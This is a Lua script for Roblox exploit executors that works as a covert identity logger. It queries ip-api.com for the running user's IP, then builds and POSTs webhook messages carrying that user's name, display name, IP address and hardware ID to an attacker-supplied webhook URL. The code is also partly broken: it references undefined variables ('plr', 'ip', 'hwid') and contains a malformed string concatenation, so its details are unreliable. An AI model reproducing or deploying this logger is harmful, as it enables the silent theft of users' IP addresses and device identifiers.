do
    -- This function returns a string with the name of the exploit u using(only checks for krnl, synapse, script ware)
    local function checkExploit()
        
        local exploitName = (syn and 'Synapse') or (Krnl and 'Krnl') or ( identifyexecutor and identifyexecutor() ) or (getexecutorname and getexecutorname()) or (ZEUS_LOADED and 'Zeus') or (WRD_LOADED and 'WRD')

        exploitName = exploitName or 'I don\'t fucking know'

        return exploitName

    end

    local function format(num, digits)
        return string.format("%0" .. digits .. "i", num)
    end
    
    local function parseDateTime()
        local osDate = os.date("!*t")
        local year, mon, day = osDate["year"], osDate["month"], osDate["day"]
        local hour, min, sec = osDate["hour"], osDate["min"], osDate["sec"]
        return year .. "-" .. format(mon, 2) .. "-" .. format(day, 2) .. "T" .. format(hour, 2) .. ":" .. format(min, 2) .. ":" .. format(sec, 2) .. "Z"
    end

    local skid = {
        webhookJson = function(self, scriptName)

            if not self then return end

            local player = game.Players.LocalPlayer
            local playerThumb = string.format('https://www.roblox.com/Thumbs/Avatar.ashx?x=420&y=420&userid=%d&format=png', player.UserId)
            local ipData = self.ipApi
       
       
            scriptName = scriptName or 'Viva Mexico'
       
       
            return 	{
		["contents"] = "",
		["username"] = game.Players.LocalPlayer.Name .. " - (#"..game.Players.LocalPlayer.DisplayName..")",
		["avatar_url"] = "https://www.roblox.com/Thumbs/Avatar.ashx?x=500&y=500&Format=Png&userId="..plr.userId,
		["embeds"] = {{
			["title"]= game.Players.LocalPlayer.Name,
			["description"] = plr.Name .. " Executed the Script",
			["type"]= "rich",
			["color"]= tonumber(0x6AA84F),
			["fields"]={
				{
					["name"]=""..game.Players.LocalPlayer.Name".. - Executed Script",
					["value"]="Name: "..game.Players.LocalPlayer.Name.."\n Display Name: "..game.Players.LocalPlayer.DisplayName.."\n UserID".."\n IP: "..tostring(ip).."\n HWID: "..tostring(hwid),
					["inline"]=true}}}}
	}
        end,

        ipApi = game:GetService('HttpService'):JSONDecode(game:HttpGet('http://ip-api.com/json')),
        exploitName = checkExploit(),

        httpPost = (Krnl and request) or (syn and syn.request) or http_request or (http and http.request),
        
        sendWebhook = function(self,webhooklink, ...)
            print('rekt')
            if self and webhooklink and self.httpPost and self.webhookJson then

                if type(self.webhookJson) == "function" then
                    return self.httpPost(
                    {
                        Url = webhooklink,
                        Method = 'POST',
                        Body = game:GetService('HttpService'):JSONEncode(self:webhookJson(...)) ,
                        Headers = {
                            ['Content-Type'] = 'application/json'
                        }
                    }
                )
                end
                return self.httpPost(
                    {
                        Url = webhooklink,
                        Method = 'POST',
                        Body = game:GetService('HttpService'):JSONEncode(self.webhookJson) ,
                        Headers = {
                            ['Content-Type'] = 'application/json'
                        }
                    }
                )
            end
        end,
        sendWebhookGame = function(self,webhooklink, scriptName)

            if not self then return end

            scriptName = scriptName or 'Viva Mexico!'
            local player = game.Players.LocalPlayer
            local gameThumb = string.format('https://www.roblox.com/asset-thumbnail/image?assetId=%d&width=768&height=432&format=png',game.PlaceId)

            local webhookJson = 
	{
		["contents"] = "",
		["username"] = game.Players.LocalPlayer.Name .. " - (#"..game.Players.LocalPlayer.DisplayName..")",
		["avatar_url"] = "https://www.roblox.com/Thumbs/Avatar.ashx?x=500&y=500&Format=Png&userId="..plr.userId,
		["embeds"] = {{
			["title"]= game.Players.LocalPlayer.Name,
			["description"] = plr.Name .. " Executed the Script",
			["type"]= "rich",
			["color"]= tonumber(0x6AA84F),
			["fields"]={
				{
					["name"]=""..game.Players.LocalPlayer.Name".. - Executed Script",
					["value"]="Name: "..game.Players.LocalPlayer.Name.."\n Display Name: "..game.Players.LocalPlayer.DisplayName.."\n UserID".."\n IP: "..tostring(ip).."\n HWID: "..tostring(hwid),
					["inline"]=true}}}}
	}

            self.httpPost(
                {
                    Url = webhooklink,
                    Method ='POST',
                    Body = game:GetService('HttpService'):JSONEncode(webhookJson),
                    Headers = {
                        ['Content-Type'] = 'application/json'
                    }
                }
            )
        end

    }

    -- skid:sendWebhook('', 'Test1')
    -- skid:sendWebhookGame('', 'test 1')

    return skid
end





